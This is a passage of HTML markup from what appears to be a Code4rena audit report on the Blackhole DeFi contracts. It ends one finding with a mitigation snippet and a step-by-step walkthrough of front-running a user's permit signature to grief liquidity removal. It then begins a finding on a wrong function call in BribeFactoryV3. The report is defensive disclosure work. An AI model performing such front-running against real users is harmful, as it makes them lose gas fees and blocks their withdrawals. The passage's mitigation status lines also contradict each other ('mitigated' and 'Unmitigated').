class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Permit succeeded\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    } \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ecatch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Permit failed, check if we have sufficient allowance\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIBaseV1Pair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eallowance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) \u0026gt;= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eliquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Insufficient allowance\u0026quot;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eremoveLiquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eliquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountAMin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountBMin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeadline\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis approach follows the industry-standard mitigation pattern that successfully resolved this vulnerability across 100+ affected codebases.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-6\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-6\" aria-label=\"proof of concept 6 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003eTheoretical attack walkthrough:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eSetup Phase\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eAlice holds 1000 LP tokens in pair \u003ccode\u003e0xABC...\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eAlice wants to remove liquidity efficiently using \u003ccode\u003eremoveLiquidityWithPermit()\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eBob (attacker) monitors the mempool for permit-based transactions\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eSignature Creation\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eAlice creates permit signature: \u003ccode\u003epermit(alice, routerV2, 1000, deadline, nonce=5)\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eSignature parameters: \u003ccode\u003ev=27, r=0x123..., s=0x456...\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eTransaction Submission\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eAlice submits: \u003ccode\u003eremoveLiquidityWithPermit(tokenA, tokenB, false, 1000, 950, 950, alice, deadline, false, 27, 0x123..., 0x456...)\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eTransaction enters mempool with 20 gwei gas price\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eFront-Running Execution\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eBob extracts parameters from Alice’s pending transaction\u003c/li\u003e\n\u003cli\u003eBob submits direct call: \u003ccode\u003eIBaseV1Pair(0xABC...).permit(alice, routerV2, 1000, deadline, 27, 0x123..., 0x456...)\u003c/code\u003e with 25 gwei gas\u003c/li\u003e\n\u003cli\u003eBob’s transaction mines first, consuming Alice’s nonce (nonce becomes 6)\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eVictim Transaction Failure\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eAlice’s transaction executes but fails at line 475\u003c/li\u003e\n\u003cli\u003eRouterV2 calls \u003ccode\u003epermit()\u003c/code\u003e with already-used signature\u003c/li\u003e\n\u003cli\u003eLP token rejects due to invalid nonce (expects 6, gets signature for nonce 5)\u003c/li\u003e\n\u003cli\u003eEntire transaction reverts with “Invalid signature” or similar error\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eAttack Result\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eAlice loses ~\u003ccode\u003e$15\u003c/code\u003e in gas fees (failed transaction cost)\u003c/li\u003e\n\u003cli\u003eAlice cannot remove liquidity via permit method\u003c/li\u003e\n\u003cli\u003eBob spent ~\u003ccode\u003e$3\u003c/code\u003e in gas to grief Alice\u003c/li\u003e\n\u003cli\u003eAttack can be repeated indefinitely against any permit user\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e\u003cstrong\u003eImpact Example:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eDuring high network activity (50+ gwei), failed transactions cost \u003ccode\u003e$25-75\u003c/code\u003e each\u003c/li\u003e\n\u003cli\u003eSystematic attacks against 100 users = \u003ccode\u003e$2,500-7,500\u003c/code\u003e in direct user losses\u003c/li\u003e\n\u003cli\u003eNo recourse for affected users; losses are permanent\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues\"\u003eBlackhole mitigated\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStatus:\u003c/strong\u003e Unmitigated. Full details in reports from \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-34\"\u003erayss\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-11\"\u003elonelybones\u003c/a\u003e, and also included in the \u003ca href=\"#mitigation-review\"\u003eMitigation Review\u003c/a\u003e section below.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-11-incorrect-function-call-in-bribefactoryv3-recovererc20andupdatedata\" style=\"position:relative;\"\u003e\u003ca href=\"#m-11-incorrect-function-call-in-bribefactoryv3-recovererc20andupdatedata\" aria-label=\"m 11 incorrect function call in bribefactoryv3 recovererc20andupdatedata permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-142\"\u003e[M-11] Incorrect function call in \u003ccode\u003eBribeFactoryV3\u003c/code\u003e \u003ccode\u003erecoverERC20AndUpdateData\u003c/code\u003e\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-74\"\u003eEgbe\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-446\"\u003eNexusAudits\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/factories/BribeFactoryV3.sol#L209-L219\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/factories/BribeFactoryV3.sol#L209-L219\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-8\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-8\" aria-label=\"finding description 8 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003erecoverERC20AndUpdateData\u003c/code\u003e function in the \u003ccode\u003eBribeFactoryV3\u003c/code\u003e contract incorrectly calls \u003ccode\u003eemergencyRecoverERC20\u003c/code\u003e instead of \u003ccode\u003erecoverERC20AndUpdateData\u003c/code\u003e on the \u003ccode\u003eIBribe\u003c/code\u003e interface. This misnamed function call results in the failure to update the \u003ccode\u003etokenRewardsPerEpoch\u003c/code\u003e mapping in the \u003ccode\u003eBribe\u003c/code\u003e contract, which is critical for maintaining accurate reward accounting.\u003c/p\u003e\n\u003ch3 id=\"root-cause-1\" style=\"position:relative;\"\u003e\u003ca href=\"#root-cause-1\" aria-label=\"root cause 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRoot Cause\u003c/h3\u003e\n\u003cp\u003eIn \u003ccode\u003eBribeFactoryV3.sol\u003c/code\u003e, the \u003ccode\u003erecoverERC20AndUpdateData\u003c/code\u003e function is defined as follows:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"51\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erecoverERC20AndUpdateData\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_bribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokens\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_amounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_bribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokens\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;MISMATCH_LEN\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokens\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_amounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;MISMATCH_LEN\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_bribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e++){\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_amounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIBribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_bribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eemergencyRecoverERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokens\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e], \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_amounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe function calls \u003ccode\u003eIBribe(_bribe[i]).emergencyRecoverERC20\u003c/code\u003e instead of \u003ccode\u003eIBribe(_bribe[i]).recoverERC20AndUpdateData\u003c/code\u003e. The correct function, \u003ccode\u003erecoverERC20AndUpdateData\u003c/code\u003e in the \u003ccode\u003eBribe\u003c/code\u003e contract, updates the \u003ccode\u003etokenRewardsPerEpoch\u003c/code\u003e mapping to reflect the recovered tokens:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"52\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erecoverERC20AndUpdateData\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyAllowed\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt;= \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;TOO_MUCH\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_startTimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIMinter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eactive_period\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() + \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eWEEK\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_lastReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenRewardsPerEpoch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e][\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_startTimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenRewardsPerEpoch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e][\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_startTimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_lastReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan 